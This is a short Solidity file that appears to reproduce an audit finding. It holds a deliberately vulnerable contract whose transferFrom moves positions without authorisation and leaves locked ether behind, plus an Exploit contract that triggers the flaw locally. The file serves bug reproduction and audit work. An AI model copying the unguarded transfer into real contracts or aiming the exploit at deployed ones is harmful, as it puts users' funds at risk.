// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// AuditVault 48700: Abacus transferFrom drops locked ether. Reduced local model preserves the reported state transition.

contract Vulnerable {
    mapping(address => uint256) public positions; uint256 public ethLocked = 100; function seed(address who) external { positions[who] = 1; } function transferFrom(address from, address to) external { positions[to] = positions[from]; positions[from] = 0; }
}

contract Exploit {
    Vulnerable public bug;
    bool public success;

    constructor() {
        bug = new Vulnerable();
    }

    function attack() external {
        bug.seed(address(this)); bug.transferFrom(address(this), address(0xBEEF)); success = bug.positions(address(0xBEEF)) == 1 && bug.ethLocked() == 100;
    }
}


